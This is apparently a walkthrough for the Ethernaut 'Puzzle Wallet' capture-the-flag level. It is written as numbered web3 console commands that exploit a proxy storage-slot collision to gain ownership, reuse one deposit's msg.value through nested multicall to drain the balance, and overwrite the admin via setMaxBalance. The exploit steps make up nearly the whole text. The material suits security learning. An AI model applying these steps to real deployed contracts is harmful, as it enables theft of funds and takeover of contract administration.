Call proposeNewAdmin on Proxy contract with player address by sending transaction to PuzzleWallet contract
--> updates storage slot 0 on Proxy to player address (owner on PuzzleWallet)

1) web3.eth.abi.encodeFunctionCall({
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [{
        type: 'uint256',
        name: 'myNumber'
    }]
}, [player]);



2) await web3.eth.sendTransaction({from: player, to: instance, data})


3) await contract.addToWhitelist(player)


 Pass multicallData twice into the multicall function to call deposit function twice with same msg.value (increments balance of player to 0.002 ether)

4) depositData = await contract.methods["deposit()"].request().then(v => v.data)

5) multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)

6) await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})


Set contract balance to 0 
7) await contract.execute(player, toWei('0.002'), "0x0")


Call setMaxBalance and pass in player address which updates the admin state variable to player
8) await contract.setMaxBalance(player)






